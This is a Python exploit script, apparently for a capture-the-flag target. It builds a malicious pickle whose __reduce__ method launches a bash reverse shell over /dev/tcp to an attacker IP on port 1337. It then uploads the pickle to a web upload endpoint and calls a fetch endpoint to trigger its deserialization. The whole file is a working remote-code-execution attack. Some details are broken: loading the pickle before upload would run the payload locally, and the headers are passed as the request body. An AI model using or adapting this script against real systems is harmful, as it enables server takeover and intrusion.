import pickle
import base64
import os 
import requests


class RCE:
    def __reduce__(self):
        cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/10.14.43.145/1337 <&1'")
        return os.system, (cmd,)


if __name__ == "__main__":
    upload_url = 'http://dev.incognito.com/secret/upload/script.php'
    upload_headers = {"Origin": "http://dev.incognito.com", "Content-Type": "multipart/form-data"}
    rshell_url = 'http://incognito.com/fetch'
    rshell_headers = {"Host":"incognito.com", "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/json", "Origin": "http://incognito.com", "Referer": "http://incognito.com/"}
    bad_pickle_obj = '{"object":"/var/upload/badpickle.pkl"}'

    with open('badpickle.pkl', 'wb') as f:
        pickle.dump(RCE(),f)
    
    with open("badpickle.pkl", "rb") as g:
        thebadpickle = {'the_file': ('badpickle.pkl', pickle.load(g))} 

    try:
        upload_response = requests.post(url=upload_url, headers=upload_headers, files=thebadpickle)
        if upload_response.status_code == 200:
            print("File uploaded successfully")
        else:
            print("File upload failed")
    except requests.exceptions.RequestException as e:
        print(e)
    
    get_shell_response = requests.post(rshell_url, rshell_headers, data=bad_pickle_obj)
    exit()
